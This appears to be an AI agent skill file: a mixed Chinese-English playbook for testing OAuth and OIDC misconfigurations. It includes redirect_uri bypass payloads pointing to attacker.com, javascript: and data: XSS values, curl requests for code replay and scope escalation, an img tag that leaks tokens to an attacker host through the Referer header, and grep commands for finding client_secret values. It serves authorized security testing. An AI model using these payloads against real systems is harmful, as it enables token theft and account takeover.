---
name: oauth-oidc-misconfiguration
description: >-
  OAuth and OIDC misconfiguration testing playbook. Use when reviewing redirect URI handling, state and nonce validation, PKCE, token audience, callback binding, and identity-provider trust flaws.
---

## 二、OAuth 2.0 测试

### 2.1 redirect_uri 绕过

```bash
# 原始授权 URL
https://oauth.target.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://target.com/callback&
  response_type=code&
  scope=read

# 绕过方法 1: 子目录
redirect_uri=https://target.com/callback/../../attacker.com

# 绕过方法 2: 子域名
redirect_uri=https://attacker.target.com/callback

# 绕过方法 3: 参数污染
redirect_uri=https://target.com/callback?next=https://attacker.com

# 绕过方法 4: 开放重定向链
redirect_uri=https://target.com/redirect?url=https://attacker.com

# 绕过方法 5: 域名混淆
redirect_uri=https://target.com.attacker.com
redirect_uri=https://target.com@attacker.com
redirect_uri=https://target.com%2eattacker.com

# 绕过方法 6: 协议混淆
redirect_uri=javascript:alert(document.domain)
redirect_uri=data:text/html,<script>alert(1)</script>
```

### 2.2 state 参数测试

```bash
# 测试 1: state 参数缺失
# 去掉 state 参数，观察是否仍能完成授权 → CSRF 风险

# 测试 2: state 可预测
# 多次授权，观察 state 是否有规律（递增、时间戳等）

# 测试 3: state 重放
# 使用已用过的 state 再次授权
```

### 2.3 授权码重放

```bash
# 1. 完成一次授权，获取 code
# 2. 用 code 换取 access_token
# 3. 再次用同一 code 换取 token
# 如果成功 → 授权码可重放

curl -X POST "https://oauth.target.com/token" \
  -d "grant_type=authorization_code" \
  -d "code=USED_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "redirect_uri=https://target.com/callback"
```

### 2.4 scope 提升

```bash
# 请求时 scope=read
# 授权后修改 code 换 token 时的 scope

curl -X POST "https://oauth.target.com/token" \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "redirect_uri=https://target.com/callback" \
  -d "scope=read write admin"  # 提升权限
```

### 2.5 隐式授权流 token 泄露

```bash
# Implicit Flow 直接在 URL fragment 返回 token
https://target.com/callback#access_token=TOKEN&token_type=Bearer

# 风险:
# 1. Referer 泄露（访问外部链接时）
# 2. 浏览器历史记录
# 3. 日志记录

# 测试: 在回调页面插入外部资源
<img src="https://attacker.com/log">
# 检查 attacker.com 日志是否收到 Referer 含 token
```

### 2.6 PKCE 缺失测试

```bash
# PKCE (Proof Key for Code Exchange) 用于防止授权码拦截

# 测试: 不发送 code_challenge 和 code_verifier
# 1. 授权时不带 code_challenge
# 2. 换 token 时不带 code_verifier
# 如果仍能成功 → 未强制 PKCE
```

### 2.7 client_secret 泄露

```bash
# 检查 JS 源码
grep -r "client_secret" *.js
grep -r "clientSecret" *.js

# 检查移动端 APK
apktool d app.apk
grep -r "client_secret" app/

# 检查 Git 历史
git log -p | grep -i "client_secret"
```

---

## 13. OAUTH TESTING CHECKLIST

```
□ Check for state parameter in authorization request
□ Test redirect_uri manipulation (open redirect, prefix match, path confusion)
□ Can tokens be exchanged more than once?
□ Test scope escalation during token exchange
□ Implicit flow: check for token in Referer/history
□ PKCE: can code_challenge be bypassed or code_verifier be empty?
□ Check for authorization code reuse (code must be single-use)
□ Test account linking abuse: link OAuth to existing account with same email
□ Check OAuth provider confusion: use Apple ID to link where Google expected
```

---

## 补充：oauth-oidc-misconfiguration

### oauth-oidc-misconfiguration

### OAuth and OIDC Misconfiguration — Redirects, PKCE, Scopes, and Token Binding

## 1. WHEN TO LOAD THIS SKILL

Load when:

- The app supports `Login with Google`, GitHub, Microsoft, Okta, or other IdPs
- You see `authorize`, `callback`, `redirect_uri`, `code`, `state`, `nonce`, or `code_challenge`
- Mobile or SPA clients rely on OAuth or OIDC flows

For token cryptography and JWT header abuse, also load:

- [jwt oauth token attacks](oauth-jwt-test.md)

## 2. HIGH-VALUE MISCONFIGURATION CHECKS

| Theme | What to Check |
|---|---|
| `state` handling | missing, static, predictable, or not bound to user session |
| `redirect_uri` validation | prefix match, open redirect chaining, path confusion, localhost leftovers |
| PKCE | missing for public clients, code verifier not enforced, downgraded flow |
| OIDC `nonce` | missing or not validated on ID token return |
| token audience and issuer | weak `aud` / `iss` checks, cross-client token reuse |
| account binding | callback binds attacker identity to victim session |
| scope handling | broader scopes granted than the user or client should receive |

## 3. QUICK TRIAGE

1. Map the full flow: authorize, callback, token exchange。用户给的会话不要测登出。
2. Replay callback flows with altered `state`, `nonce`, and `redirect_uri`.
3. Compare SPA, mobile, and web clients for weaker validation.
4. Check whether one provider account can be rebound to another local account.

## 4. RELATED ROUTES

- 跨域读 token：SRC 不挖 CORS，**勿开** `cors-test.md`。有跨站写走 `csrf-test.md`，有越权读走 `idor-test.md`
- XML federation or enterprise SSO: [saml sso assertion attacks](oauth-jwt-test.md)
- CSRF-heavy login or binding bugs: [csrf cross site request forgery](csrf-test.md)

---
